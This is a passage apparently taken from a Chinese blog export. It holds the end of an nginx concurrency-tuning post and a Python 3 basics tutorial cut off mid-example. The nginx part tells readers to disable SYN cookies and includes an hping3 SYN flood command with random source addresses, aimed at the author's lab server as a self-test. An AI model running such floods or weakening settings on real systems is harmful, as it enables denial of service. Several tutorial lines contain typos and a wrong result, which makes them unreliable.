-n 80000 http://192.168.224.12/index.html并发达到2000后服务器响应速度就变慢了， 开始优化 1234ulimit -n 发现最大打开文件描述符是1024， 这时候要优化了，把改为最大65535ulimit -SHn 65535echo &quot;ulimit -SHn 65535&quot; &gt;&gt; /etc/rc.local （设置永久生效） 配置nginx性能统计模块 12345678910111213141516171819202122server { listen 80 ; server_name server2.com; #工作中一般选择localhost location = /status { access_log off; stub_status on; allow 127.0.0.1 ; allow 192.168.224.12 ; allow 192.168.224.1; deny all; #限制所有 }}访问就能出现结果了；http://server2.com/status Active connections: 2 #活跃连接数，并发server accepts handled requests 750427 750427 747109 Reading: 0 Writing: 1 Waiting: 1 1.优化socket层面 优化nginx 1234567worker_rlimit_nofile 10000; worker_processes auto;events { worker_connections 65535; #设置子进程能打开多少个sock连接。设置最大。} 系统层面 12345678910111213141516171819cat /proc/sys/net/core/somaxconn #这里面都是系统运行状态的值。发现是128 把改大128echo 50000 &gt; /proc/sys/net/core/somaxconn加快tcp连接的回收回收recyclecat /proc/sys/net/ipv4/tcp_tw_recycle0 #表示不回收，echo 1 &gt; /proc/sys/net/ipv4/tcp_tw_recycle空的tcp是否允许回收利用reusecat /proc/sys/net/ipv4/tcp_tw_reuse0echo 1 &gt; /proc/sys/net/ipv4/tcp_tw_reuse关闭洪峰防御cat /proc/sys/net/ipv4/tcp_syncookies1echo 0 &gt; /proc/sys/net/ipv4/tcp_syncookies 直接写个脚本 12345678vim tcpopt.sh#!/bin/bashecho 50000 &gt; /proc/sys/net/core/somaxconnecho 1 &gt; /proc/sys/net/ipv4/tcp_tw_recycleecho 1 &gt; /proc/sys/net/ipv4/tcp_tw_reuseecho 0 &gt; /proc/sys/net/ipv4/tcp_syncookies 这时候再去访问，会发现可以支持2000并发了 1ab -c 2000 -n 100000 http://192.168.224.12/index.html 5千的并发,客户端撑不住了。 1ab -c 5000 -n 200000 http://192.168.224.12/index.html 客户端也优化下 12ulimit -SHn 65535echo 50000 &gt; /proc/sys/net/core/somaxconn 用两台客户端测试分别5000并发 这时服务端还是可以支持共1万的并发 下面在测试其他参数加个-k参数 1ab -c 5000 -n 200000 -k http://192.168.224.12/index.html 这时候会发现很多是Waiting状态。等待状态。 需要修改nginx的keeplive_timeout的时间 123keepalive_timeout 65; #65秒太多了。对于高并发的网站，这个需要修改最小。keepalive_timeout 0; #修改为0秒。 系统层面的优化还有其他参数需要修改。可以向上面的动态修改关机重启就恢复默认了，也可以写入/etc/sysctl.conf文件中 如下参考: 12345678910111213141516171819vim /etc/sysctl.conffs.file-max = 1000000fs.inotify.max_user_instances = 8192net.ipv4.tcp_syncookies = 1 #1是打开洪峰防御net.ipv4.tcp_fin_timeout = 30net.ipv4.tcp_tw_reuse = 1 # 对应上面的/proc/sys/net/ipv4/tcp_tw_reuse 文件net.ipv4.ip_local_port_range = 1024 65000net.ipv4.tcp_max_syn_backlog = 16384net.ipv4.tcp_max_tw_buckets = 6000net.ipv4.route.gc_timeout = 100net.ipv4.tcp_syn_retries = 1 #默认为6次尝试连接。大概就是63秒 ，所以改为1。net.ipv4.tcp_synack_retries = 1net.core.somaxconn = 50000 #对应上面的/proc/sys/net/core/somaxconn 文件。net.core.netdev_max_backlog = 32768net.ipv4.tcp_timestamps = 0net.ipv4.tcp_max_orphans = 32768# forward ipv4net.ipv4.ip_forward = 1 sync洪峰攻击测试 123yum install -y hping3hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.224.12 使用 netstart -nat 会发现很多tcp的连接状态是属于SYN_RECV状态","link":"/2020/08/03/nginx%E5%9F%BA%E7%A1%80/"},{"title":"python3基础知识重点","text":"[toc] 一，python3基础知识重点1, 数据与存储 12345内存:抽象: 一个开关，有两种状态，开启和关闭，一种状态对应1，另一种状态对应0，把八个开关放到一个房间里，这个房间称为&quot;一个字节&quot; ,一个开关代表&quot;一位&quot; 。每个房间都有门牌号，看作&quot;地址&quot;, 把无数个房间堆叠起来组成摩天大楼，可以把摩天大楼看成&quot;内存&quot;数据存储: 计算机存储数据，先开辟内存空间，再存储数据。计算机开辟内存的最小单位是字节。在存储数据时。用最高位标示符号，1表示负数，0表示正数。 2,python数据类型1, Number(数字) 123整数浮点数(小数)复数 2, String(字符串) 3, Boolean(布尔值) 4, None(空值) 5, list(列表) 6, tuple(元组) 7, dict(字典) 8, set(集合) 标识符 12345678910111213什么是标识符 是一串字符串(注意： 字符串未必是标示符)规则 只能由字母，数字，下划线组成 开头不能是数字 不能是python的关键字 区分大小写 见名知意 遵循驼峰原则作用 给变量，函数等命名注意 在python3中，非ASCLL标识符也是允许的 查看关键字 12345import keywordprint(keyword.kwlist)['False', 'None', 'True', 'and', 'as', 'assert', 'async', 'await', 'break', 'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'finally', 'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 'nonlocal', 'not', 'or', 'pass', 'raise', 'return', 'try', 'while', 'with', 'yield'] 1,浮点数 12345678print(10 / 2) #正如您之前看到的，两个整数相除将产生一个浮点数。一个浮点数也是通过在两个浮点数或者在一个浮点数和一个整数上运算来产生的。print(6 * 7.0)print(5 + 2.32)结果：5.042.07.32 不可变对象 Python 中一切皆对象，每一个对象都有一个唯一的标示符（id()）、类型（type()）以及值。对象根据其值能否修改分为可变对象和不可变对象，其中数字、字符串、元组属于不可变对象，字典以及列表、字节数组属于可变对象。而“菜鸟”常常会试图修改字符串中某个字符。看下面这个例子： 1234567teststr = &quot;I am a string&quot;teststr[11]='h'print(teststr)这样会报错 如果要修改字符串, 可以重新给生成一个字符串,或者将字符串拆解成数组,修改完成后再合并成字符串 类型转换 在 Python 中，涉及到一些类型是不能完成某些操作的。 例如，您不能将包含数字2和3的两个字符串添加到一起以生成整数5，因为操作会将在字符串拼接为“23”。 解决方案是类型转换。 在这个例子中，你将使用 int 函数将字符串转成整数。 12345print(&quot;2&quot; + &quot;3&quot;)print(int(&quot;2&quot;) + int(&quot;3&quot;))结果235 另一个类型转换的例子是将用户输入（会自动转成一个字符串）转换为数字（整数或浮点数），以便进行计算。 1234&gt;&gt;&gt; float(input(&quot;Enter a number: &quot;)) + float(input(&quot;Enter another number: &quot;))Enter a number: 30Enter another number: 232.0 python 中文编码 前面章节中我们已经学会了如何用 Python 输出 “Hello, World!”，英文没有问题， 但是如果你输出中文字符”你好，亿动”就有可能会碰到中文编码问题。 解决方法很简单， 只要在文件开头加入 # -*- coding: UTF-8 -*- 或者 #coding=utf-8 就行了。 123456789101112131415#!/usr/bin/python# -*- coding: UTF-8 -*-print(&quot;你好，亿动&quot;)#编码#encode(encoding=&quot;utf-8&quot;, errors=&quot;strict&quot;)str51=&quot;yichen is a good man&quot;data52= str51.encode(&quot;utf-8&quot;)print (data52)# ignore 忽略错误#解码 注意: 要与编码时的格式一致。#decode()str53= data52.decode(&quot;utf-8&quot; ,&quot;ignore&quot;)print (str53) 2, 字符串 字符串详细格式化和内置函数方法参考1.1python字符串内置函数总结文档 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#创建字符串str1 = &quot;yichen is a good man!&quot;str3 = &quot;yichen is a nice man!&quot;str5 = &quot;yichen is a handsome man!&quot;'''字符串运算'''#字符串连接str6 = &quot;yichen is a &quot;str7 = &quot; good man!&quot;str8 = str6 + str7print (&quot;str6 = &quot;, str6)print ( &quot;str7 = &quot;, str7)print (&quot;str8 = &quot;, str8 )#输出重复字符串str9 = &quot;good&quot;str10 = str9 * 3print (&quot;str10 =&quot;, str10)#访问字符串中的某一个字符#通过索引下标查找字符。索引从0开始,字符串名[下标]str11 = &quot;yichen is a good man!&quot;print (str11[1])#str11[1] = &quot;a&quot; # 字符串不可变#截取字符串中的一部分str13 = &quot;yichen is a good man!&quot;str15 = str13[7:16]str16 = str13[:6]print (&quot;str15 =&quot; , str15)print (&quot;str16 =&quot; , str16)str17 = str13[16:]print (&quot;str17 =&quot;, str17)str18 = &quot;yichen is a good man &quot;print (&quot;good&quot; in str18)print (&quot;good1&quot; not in str18)#格式化输出print (&quot;yichen is a good man&quot;)num = 10str19 = &quot;yichen is a nice man!&quot;f = 10.1267print (&quot;num =&quot;, num )# %d %s %f 占位符print(&quot;num = %d, \\nstr19= %s,\\n f = %.3f &quot; % (num,str19, f))#打印多行print ('''goodnicehandsome''')#如果字符串中有很多字符串都需要转义。python允许用r 表示内部的字符串默认不转义print ( r&quot;\\\\\\t\\\\&quot;) 3,布尔类型 Python 中的另一种类型是布尔类型。有两个布尔值：True 和 False。 可以通过比较值的方法来创建它们，例如通过使用相等的运算符 **==**。 1234567891011&gt;&gt;&gt; my_boolean = True&gt;&gt;&gt; my_booleanTrue&gt;&gt;&gt; 2 == 3False&gt;&gt;&gt; &quot;hello Edong&quot; == &quot;hello Edong&quot;True注意：不要把赋值（一个等号）与比较（两个等号）混淆。Python是区分大小写的，所以True与true是不同的。 空值：是Python里一个特殊的值，用None表示。None不能理解为0，因为0是有意义的。而None是一个特殊值。 4，列表 列表是 Python 中的另一种类型的对象。它们被用来存储索引的元素列表。 方括号中用逗号分隔元素来创建一个列表。 列表中的某个元素可以通过使用方括号中的索引来访问。 例如： 1234words = [&quot;Hello&quot;, &quot;world&quot;, &quot;!&quot;]print(words[0])print(words[1])print(words[2]) 通常情况下，列表包含单种数据类型的元素，但也可以包含几个不同的类型。 列表也可以嵌套在其他列表中。 123456789number = 3things = [&quot;string&quot;, 0, [1, 2, number], 4.56]print(things[1])print(things[2])print(things[2][2])结果0[1, 2, 3]3 列表操作 1，列表中某个索引处的元素值可以被重新分配。 例如 1234567891011121314151617181920212223242526272829303132nums = [7, 7, 7, 7, 7]nums[2] = 5print(nums)2，列表可以像字符串一样添加和相乘。nums = [1, 2, 3]print(nums + [4, 5, 6])print(nums * 3)结果[1, 2, 3, 4, 5, 6][1, 2, 3, 1, 2, 3, 1, 2, 3]3，要查找某个值是否在列表中，可以使用 in 运算符。如果值在列表中出现一次或多次，则返回 True，否则返回 Falsewords = [&quot;spam&quot;, &quot;egg&quot;, &quot;spam&quot;, &quot;sausage&quot;]print(&quot;spam&quot; in words)print(&quot;egg&quot; in words)print(&quot;tomato&quot; in words)结果TrueTrueFalse4，要某个值是否不在列表中，可以使用 not 操作符：nums = [1, 2, 3]print(not 4 in nums)print(4 not in nums)print(not 3 in nums)print(3 not in nums)结果TrueTrueFalseFalse 列表函数 可以使用 append 方法将一个元素添加到现有列表的末尾。 12345678nums = [1, 2, 3]nums.append(4)print(nums) #结果：[1, 2, 3, 4]nums.append([7,8,9])print (nums)结果: 1, 2, 3, 4, [7, 8, 9]]append 是列表类的一个方法。 要获取列表中的项目数量，可以使用 len 函数。 1234nums = [1, 3, 5, 2, 4]print(len(nums))结果：5 与 append 方法不同，len 是一个正常的函数，而不是一个方法。这意味着它写在被调用的列表之前。 insert 方法与 append 相似，不同之处在于它允许您在列表中的任何位置插入一个新元素，而不仅仅是在最后。 123456words = [&quot;W3Cschool&quot;, &quot;Good&quot;]index = 1words.insert(index, &quot;is&quot;)print(words)结果：['W3Cschool', 'is', 'Good'] extend() 在末尾一次性追加另一个列表中的多个值 1234list = [1,2,3,4,5]list.exend([6,7,8])pirnt(list)结果[1, 2, 3, 4, 5, 6, 7, 8] index 方法找到列表项的第一个匹配项并返回它的索引。 如果该项目不在列表中，则会引发 ValueError。 1234567891011121314151617181920212223letters = ['p', 'q', 'r', 's', 'p', 'u']print(letters.index('r'))print(letters.index('p'))print(letters.index('z'))20ValueError: 'z' is not in list列表还有一些很有用的功能和方法。max(list): 返回具有最大值的列表元素min(list): 返回具有最小值的列表元素list.count(3): 返回一个元素3在一个列表中出现的次数list.remove(3):从列表中删除一个元素的第一个匹配的结果list.reverse():颠倒列表中的元素的顺序list.pop() #移除列表中指定下标处的元素(默认移除最后一个元素)list.clear() #清除列表中所有数据list.sort() #排序 升序list.copy() #深拷贝 内存的拷贝 5，元组 元组与列表非常相似，不过元组是不可变的。 而且，它们使用圆括号创建，而不是方括号。 1words = (&quot;spam&quot;, &quot;eggs&quot;, &quot;sausages&quot;,) 你可以使用索引访问元组中的值，就像使用列表一样： 1print(words[0]) 尝试重新分配元组中的值会导致 TypeError。 1words[1] = &quot;cheese&quot; 结果： 1TypeError: 'tuple' object does not support item assignment 像列表和字典一样，元组也可以相互嵌套。也可以for循环取值 元组可以在没有括号的情况下创建，只需用逗号分隔值。 例如： 1234my_tuple = &quot;one&quot;, &quot;two&quot;, &quot;three&quot;print(my_tuple[0])结果：one 元组比列表快，但是元组不能改变。 元组的截取 格式：元组名[开始下标:结束下标] 从开始小标开始截取，截取到结束小标之前 1234t1 = (1,2,3,4,5,6,7,8,9)print(t1[3:7]结果：(4, 5, 6, 7) len() 12345678#len() 返回元组中元素的个数t14 = (1,2,3,4,5)print (len(t14))#将列表转成元组list = [1,2,3]t15 = tuple(list)print (t15) 6,字典 字典 是用于将任意键映射到值的数据结构。 列表可以被认为是在一定范围内具有整数键的字典。 字典可以用与列表相同的方式建立索引。 使用 字典[“键名”] 可以获取对应的值。 例如： 123456ages = {&quot;Dave&quot;: 24, &quot;Mary&quot;: 42, &quot;John&quot;: 58}print(ages[&quot;Dave&quot;])print(ages[&quot;Mary&quot;])结果：2442 就像列表一样，字典键可以被分配到不同的值。 但是，与列表不同，新的字典键也可以被赋值，而不仅仅是已经存在的字典键。 例如： 123456squares = {1: 1, 2: 4, 3: &quot;error&quot;, 4: 16,}squares[8] = 64squares[3] = 9print(squares)结果：{8: 64, 1: 1, 2: 4, 3: 9, 4: 16} #遍历 1234567891011squares = {1: 1, 2: 4, 3: &quot;error&quot;, 4: 16,}for key in squares: print(key, squares[key])结果：1 12 43 error4 16for value in squares.values(): print(value) #直接输入值 要确定 key （键）是否在字典中，您可以使用 in 和 not，就像你可以使用列表一样。 123456789101112nums = { 1: &quot;one&quot;, 2: &quot;two&quot;, 3: &quot;three&quot;,}print(1 in nums)print(&quot;three&quot; in nums)print(4 not in nums)结果：TrueFalseTrue 一个很有用的字典方法是 get 。它与索引做同样的事情，但是如果在字典中找不到键，它将返回另一个指定的值（默认情况下为“None”）。 例如: 12345678910111213pairs = {1: &quot;apple&quot;, &quot;orange&quot;: [2, 3, 4], True: False, None: &quot;True&quot;,}print(pairs.get(&quot;orange&quot;))print(pairs.get(7))print(pairs.get(12345, &quot;not in dictionary&quot;))结果：[2, 3, 4]Nonenot in dictionary 7， 集合 集合是数据结构，类似于列表或字典。集合使用花括号或 set 函数创建。 它们与列表共享一些功能，例如使用 in 来检查它们是否包含特定项目。 12345678910num_set = {1, 2, 3, 4, 5}word_set = set([&quot;spam&quot;, &quot;eggs&quot;, &quot;sausage&quot;])print(3 in num_set)print(&quot;spam&quot; not in word_set)结果：TrueFalse 集合在几个方面不同于列表，但共享几个列表操作，如 len。 集合是无序的，这意味着他们不能被索引。 集合不能包含重复的元素。 由于存储的方式，检查一个项目是否是一个集合的一部分比检查是不是列表的一部分更快。 集合使用 add 添加元素，而不是使用 append 。 remove 方法从集合中删除特定的元素; pop 删除随机的元素。 12345678nums = {1, 2, 1, 3, 1, 4, 5, 6}print(nums)nums.add(-7)nums.remove(3)print(nums)结果：{1, 2, 3, 4, 5, 6}{1, 2, 4, 5, 6, -7} 通常使用集合来消除重复的条目。 集合可以使用数学运算进行组合。 联合运算符 | 结合两个集合形成一个包含两个集合任一项目的新集合。 相交运算符＆ 获得两个集合共有的项目 差运算符 - 获取第一集合中的项目，但不是第二集合中的项目。 对称差分运算符^ 获取任集合中非共有的项目。 1234567891011121314first = {1, 2, 3, 4, 5, 6}second = {4, 5, 6, 7, 8, 9}print(first | second)print(first &amp; second)print(first - second)print(second - first)print(first ^ second)结果：{1, 2, 3, 4, 5, 6, 7, 8, 9}{4, 5, 6}{1, 2, 3}{8, 9, 7}{1, 2, 3, 7, 8, 9} 随机数 123456789101112131415161718192021222324import random #引入模块#1. 从序列的元素中随机挑选一个元素print(random.choice([1,3,5,7,9]))print(random.choice(range(5))) #range(5)==[0,1,2,3,4]#产生一个1~100之间的随机数r1= random.choice(range(100)) + 1print(r1)#从指定范围内，按指定的基数传递的集合中选取一个随机数#random.randrange([start], stop[, step])#start 指定范围的开始值，包含在范围内#stop 指定范围的结束值，不包含在范围内#step 指定的递增基数print(random.randrange(1,100,2))#随机生成[0,1]之间的数(浮点数)print(random.random())list = [1,2,3,4,5]#将序列的所有元素随机排序random.shuffle(list)print(list)#随机生成一个实数，他在[3,9]范围内。print(random.uniform(3,9)) 数据结构 正如我们在前面的课程中所看到的，Python支持以下数据结构：列表，字典，元组，集合。 何时使用字典： - 当您需要键：值对之间的逻辑关联时。 - 当您需要基于自定义密钥快速查找数据时。 - 当你的数据不断修改时。请记住，字典是可变的。 何时使用其他类型： - 如果您有一些不需要随机访问的数据集合，请使用列表。当你需要一个简单的，可迭代的频繁修改的集合可以使用列表。 - 如果你需要元素的唯一性，使用集合。 - 当数据无法更改时使用元组。 很多时候，元组与字典结合使用，例如元组可能代表一个关键字，因为它是不可变的。 3,while 循环123456789101112if语句格式:if 表达式: 语句year = int(input(&quot;请输入年份&quot;))if year % 400 == 0 or (year % 4 == 0 and year % 100 != 0): print (&quot;是闰年&quot;)else: print (&quot;不是闰年&quot;)逻辑: 当程序执行到if语句时，首先计算&quot;表达式&quot;的值，如果&quot;表达式的值&quot;为真，那么执行if下的语句，如果表达式的值为假，则跳过整个if语句继续向下执行。 如果 if 语句的计算结果为 True，则 if 语句的代码块会运行一次，如果计算结果为 False，则不会运行。 while 语句是相似的，while 只要条件为True，while内部的代码块就会重复执行。 当条件为 False 时就停止 while 循环，程序继续往后执行。 1234567891011121314i = 1while i &lt;=5: print(i) i = i + 1print(&quot;Finished!&quot;)while 循环体中的代码被重复执行。这被称为迭代。#计算1+2+3+*******+100sum = 0num = 1while num &lt;= 100: sum += num num += 1print (&quot;sum = %d&quot; %(sum)) break 语句 要提前结束 while 循环，可以使用 break 语句。 在循环中遇到时，break 语句会立即结束循环。 12345678910i = 0while 1==1: print(i) i = i + 1 if i &gt;= 5: print(&quot;Breaking&quot;) breakprint(&quot;Finished&quot;)#在循环外部使用 break 语句会导致错误。 continue 语句 可以在循环内使用的另一个语句是 continue 语句。 与 break 不同的是，continue 语句是提前结束本次循环，进入下一次循环。 12345678910111213141516171819i = 0while True: i = i +1 if i == 2: print(&quot;Skipping 2&quot;) continue if i == 5: print(&quot;Breaking&quot;) break print(i)print(&quot;Finished&quot;)结果1Skipping 234BreakingFinished 简而言之：continue 语句停止当前的迭代，并继续下一个。 在循环外部使用 continue 语句会导致错误。 4, 范围(range)使用范围函数创建一个顺序的数字列表。 1234numbers = list(range(10))print(numbers)结果：[0, 1, 2, 3, 4, 5, 6, 7, 8, 9] Range 本身会创建一个 Range 对象，所以调用 list 函数将其转换为列表。 如果使用一个参数调用 Range，则会生成0到该参数值的对象。 如果使用两个参数调用范围，则会从第一个值到第二个值的对象。 例如： 12345678numbers = list(range(3, 8))print(numbers)print(range(20) == range(0, 20))结果：[3, 4, 5, 6, 7]True Range 可以有第三个参数，第三个参数决定了产生的序列的间隔。 1234numbers = list(range(5, 20, 2))print(numbers)结果：[5, 7, 9, 11, 13, 15, 17, 19] 注意: 第三个参数必须是一个整数, 否则会报TypeError。 5，for 循环使用 while 循环遍历列表需要相当多的代码，所以 Python 提供了 for 循环作为完成相同事情的快捷方式。 前一个例子中的代码可以用 for 循环来编写，如下所示： 12345678words = [&quot;hello&quot;, &quot;world&quot;, &quot;spam&quot;, &quot;eggs&quot;]for word in words: print(word + &quot;!&quot;) 结果：hello!world!spam!eggs! Python中的 for 循环就像其他语言的 foreach 循环一样。 for 循环通常用于重复某些代码一定次数。这是通过将循环与范围 range 对象结合来完成的。 12for i in range(5): print(&quot;hello!&quot;) 在 for 循环中使用 range 对象时不需要调用 list，因为它没有被索引，所以不需要列表。 6,函数除了使用预定义的函数外，还可以使用 def 语句创建自己的函数。 这是一个名为 my_func 的函数的例子。它不需要任何参数，并打印 “你好，Loen” 三次。先定义函数，然后被调用。 函数中的代码块仅在调用函数时执行。 123456789def my_func(): print(&quot;你好，Loen&quot;) print(&quot;你好，Loen&quot;) print(&quot;你好，Loen&quot;)my_func();结果：你好，Loen你好，Loen你好，Loen 大部分函数都有参数。 下面的例子定义了一个带有一个参数的函数： 12345678910def print_with_exclamation(word): print(word + &quot;!&quot;) print_with_exclamation(&quot;皮卡丘&quot;)print_with_exclamation(&quot;可达鸭&quot;)print_with_exclamation(&quot;小火龙&quot;)结果：皮卡丘!可达鸭!小火龙! 正如你所看到的，参数是在括号内定义的。 使用逗号分隔多个参数 12345678def print_sum_twice(x, y): print(x + y) print(x + y)print_sum_twice(3, 8) #相当于把用户输入的两个参数计算相加，然后输出，定义的参数不一样结果也不一样。结果：1111 函数参数可以在函数内部当变量使用。但是，它们不能在函数的定义之外被引用。函数内部创建的其他变量也不能在函数外部被引用 123456789def function(variable): variable += 1 print(variable)function(7) #这个函数就是输出参数值+1print(variable) #外部引用会报错结果：8 NameError: name 'variable' is not defined 默认参数 12345678910111213141516171819202122232425262728293031#概念: 调用函数时，如果没有传递参数，则使用默认参数# 要使用默认参数，最后将默认参数放到最后。def myPrint1(str = &quot;yichen is a good man &quot;, age = &quot;18&quot;): print (str, age)myPrint1()'''不定长参数概念: 能处理比定义时更多的参数'''#加了*号的变量存放所有为命名的变量参数,如果在函数调用时没有指定参数，它就是一个空元组def func (name, *args): print(name) print(type(args)) for x in arr: print(x)func(&quot;yichen&quot;,&quot;good&quot;,&quot;nice&quot;)#**代表键值对的参数字典。def func2(**kwargs): print(kwargs) print(type(kwargs))func2(x=1,y=2,z=3)#这种接收任意参数。def func3(*args, **kwargs): pass 7，函数返回值某些函数（如 int 或 str）会返回一个稍后可用的值。 定义的函数可以使用 return 语句执行此操作。 return 表达式可以不写，相当于return None 形参(形式参数): 定义函数时小括号里面的变量，本质是变量 实参(实际参数): 调用函数时给函数传递的数据，本质是值。 例如： 123456789101112def max(x, y): if x &gt;=y: return x else: return y print(max(4, 7)) #4不&gt;= 7(y),所以返回else的内容7z = max(8, 5)print(z) #条件成立，所以返回x(8)结果：78 return 语句不能在函数定义之外使用。 定义一个函数比较参数长度，并返回最短的一个。 123456789def shortest_string(x, y): if len(x)&lt;=len(y): return x else: return y print(shortest_string(&quot;hallo&quot;,&quot;ni&quot;))结果：ni 一旦你从一个函数返回一个值，函数立即停止执行。返回语句之后的任何代码都不会执行。 例如： 12345678def add_numbers(x, y): total = x + y return total print(&quot;This won't be printed&quot;) #这个就不会执行了print(add_numbers(4, 5)) #返回9 结果：9 函数与其他任何类型的值一样。可以将它们重新分配给变量，并在稍后由这些变量名称引用函数。 123456789def multiply(x, y): return x * ya = 4b = 8operation = multiplyprint(operation(a, b)) #operation(a,b)等于 multiply(a,b)函数结果：32 函数也可以做为其他函数的参数。（PS：建议大家自己打一遍，深刻感受加深理解） 12345678910111213def add(x,y): return x+y def subtract(x,y): return x-y def do_twice(func,x,y): return func(func(x,y),func(x,y)) #func参数就变成了add函数了，变成了返回 func(func(5+10),func(5+10)) 等于func(15,15)等于 30a = 5b = 10print(do_twice(add,a,b)) 正如你所看到的，函数 do_twice 接收一个函数做为参数，并在它的函数内部调用它。 将函数“square”作为参数传递给函数“test”： 123456789def square(x): return x*x #返回42*42=1746def test(func,x): print(func(x)) #输出 func(42)等于输出square(42) test(square,42)结果：1746 8, 模块概述 目前代码比较少，写在一个文件中还体现不出什么缺点，但是随着代码量越来越多，代码就越来越难以维护。 为了解决难以维护的问题，我们把很多相似功能的函数分组，分别放到不同的文件中去，这样每个文件所包含的内容就相对较少，而且，对于每一个文件的大致功能可用文件名来体现。很多编程语言都是这么来组织代码结构，一个.py文件就是一个模块。 优点： 1、提高代码的可维护性 2、提高了代码的复用度，当一个模块完毕，可以被多个地方引用， 3、引用其他的模块(内置模块和三方模块和自定义模块) 4、 避免函数名和变量名的冲突 模块是其他人为完成常见任务而编写的一些代码，例如生成随机数字，执行数学运算等。 使用模块的基本方法是在代码顶部添加 import 模块名 。 格式： import module [, 模块1[,模块2][, 模块n]] 模块可以引入多个 使用 模块名.变量 或者 模块名.函数 访问模块中的变量和函数。 123456789101112131415161718192021222324252627#引入模块import random ,time,sys, os #获取命令行参数的列表print(sys.argv)for i in sys.argv: print(i)name = sys.argv[1]age = sys.argv[2]hoby = sys.argv[3]print(name, age, hoby)#自动查找所需模块的路径的列表print(sys.path)for i in range(5): value = random.randint(1, 6) print(value) 结果：25132代码使用 radom 模块中定义的 randint 函数打印1到6范围内的5个随机数。 如果您只需要某个模块的某些功能，就可以使用另一种导入方式。 使用 from 模块名 import 变量名 的形式，然后变量名可以像在代码中正常定义一样使用。 12345from math import piprint(pi)结果：3.141592653589793 可以使用逗号分隔导入多个对象。例如： 1from math import pi, sqrt 可以使用 * 导入模块中所有对象。例如: from math import * 注意: 通常不鼓励这样做，因为它会将代码中的变量与外部模块中的变量混淆。 程序内容的函数或者变量可以将模块中的同名函数覆盖 您可以使用 as 关键字给导入的模块或对象重命名。模块或对象名称较长或容易混淆的时候比较常用。 例如: 1234from math import sqrt as square_rootprint(square_root(100))结果：10.0 一些常用的标准库 1string，re，datetime，math，random，os，multiprocessing，subprocess，socket，email，json，doctest，unittest，pdb，argparse, sys 标准库可以完成的任务包括字符串解析，数据序列化，测试，调试和操作日期，电子邮件，命令行参数等等。 许多第三方 Python 模块都存储在 Python Package Index（PyPI）中。 最好的安装方法是使用 pip 的程序。Python 的发行版默认安装了 pip。如果没有安装 pip，也可以很容易通过在线安装。 Mac和Linux无需安装pip，自带 一旦拥有它，从 PyPI 安装库是很容易的。查找要安装的库的名称，转到命令行（对于Windows，是命令提示符），然后输入 pip install 模块名。完成此操作后，导入库并在代码中使用它。 使用 pip 是在大多数操作系统上安装库的标准方法，但是一些库已经为 Windows 预编译了二进制文件。这些是正常的可执行文件，可以让您使用 GUI 安装库，这与安装其他程序的方式相同。 12#Pillow 非常强大的处理图像的工具库pip install --upgrade pip #windows如果报错，则输入这行代码，升级 自定义模块 创建一个.py文件 为luke.py 1234567891011121314#一个.py文件就是一个模块def sayGood(): print(&quot;luke is a good man&quot;)def sayNice(): print(&quot;luke is a good nice&quot;)def sayHandsome(): print(&quot;luke is a good handsome&quot;)TT = 100yy = 666 然后可以去其他文件通过文件名为模块的方式导入使用,一个模快只会被引入一次，不管你执行了多少次import。 防止模块被多次引入。格式：模块名.函数名或变量名 12345678910111213141516171819202122232425#引入自定义模块，不用加.py后缀import luke#引入自定义模块中的指定函数或变量from luke import sayGood, yya = luke.sayGood()print(a)print(luke.sayNice())print(luke.sayHandsome)print(luke.TT)sayGood()print(yy)结果：luke is a good manNoneluke is a good niceNoneluke is a good handsomeNone100luke is a good man666 2,__name__属性：模块就是一个可执行的.py文件，一个模块被另一个程序引入。我不想让模块中的模些代码执行，可以用__name__属性来使程序仅调用模块中的一部分。 每一个模块都有一个_name__属性，当其值等于”__main_\\“时,表明该模块自身在执行,否则被引入其他文件 1234567891011121314151617181920#一个.py文件就是一个模块#当前文件如果为程序的入口文件，则__name__属性的值为__main__if __name__ ==&quot;__main__&quot;: print(&quot;这是luke的.py文件&quot;)else: def sayGood(): print(&quot;luke is a good man&quot;) def sayNice(): print(&quot;luke is a good nice&quot;) def sayHandsome(): print(&quot;luke is a good handsome&quot;) TT = 100 yy = 666#从其他程序导入当前的模块的话，__name__就不等于__main__ ,一般是等于其他程序的名字， 9,异常不同的异常是由不同的原因引起的。 常见的异常： ImportError: 无法引入模块或包。 IndexError: 下标索引超出序列边界; NameError: 使用一个还未赋予对象的变量; SyntaxError: 代码逻辑语法出错，不能执行; TypeError: 传入的对象类型与要求不符; ValueError: 传入一个不被期望的值，即使类型正确。 KeyError： 试图访问你字典里不存在的键。 IOError： 输入输出异常。 Python还有其他一些内置的异常，比如 ZeroDivisionError 和 OSError 。 第三方库也经常定义自己的异常。 1，异常处理为了处理异常，并在发生异常时调用代码，可以使用 try/except 语句。 try 块包含可能会引发异常的代码。如果发生该异常，try 块中的代码将停止执行，并且 except 块中的代码将被运行。如果没有错误发生，except 块中的代码不会运行。 例如： 12345678try: num1 = 5 num2 = 0 print (num1 / num2) print(&quot;计算完成&quot;)except ZeroDivisionError: print(&quot;发生错误&quot;) print(&quot;您尝试进行除0操作&quot;) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748格式：try: 语句texcept 错误码 as e: 语句1except 错误码 as e: 语句2else: 语句e 注意: else语句可有可无作用: 用来检测try语句块中的错误,从而让except语句捕获错误信息并处理逻辑: 当程序执行到try-except-else语句时1、 如果当try“语句t”执行出现错误，会匹配第一个错误码，如果匹配上就执行对应的“语句”2、 如果当try“语句t”执行出现错误，没有匹配的异常，错误将会被提交到上一层的try语句，或者到程序的最上层。3、如果当try“语句t”执行没有出现错误，执行else下的“语句e”(你得有定义else语句#使用except带着多种异常try: print(5 / 0)except (NameError, ZeroDivisionError): print(&quot;出现了NameError或ZeroDivisionError&quot;) #特殊1、错误其实是class(类)，所有的错误都继承自BaseException,所以在捕获的时候，它捕获了该类型的错误，还把子类一网打尽try: print(5 /0)except BaseException as e: print(&quot;异常1&quot;)except ZeroDivisionError as e: print(&quot;异常2&quot;)结果：匹配 异常1，后面的就匹配不到了。本来应该是要匹配异常2才是准确的，2、跨越多层调用, main调用了func2,func2调用了func1,func1出现了错误，这时只要main捕获到了就可以处理def func1(num): print(1 / num)def func2(num): func1(num)def main(): func2(0)try: main()except ZeroDivisionError as e: print(&quot;代码出错&quot;) try 语句可以有多个不同的 except 块来处理不同的异常。除了使用圆括号的块外，还可以将多个异常放入一个单独的块中，使 except 块处理所有这些异常。 12345678910try: variable = 10 print(variable + &quot;hello&quot;) print(variable / 2)except 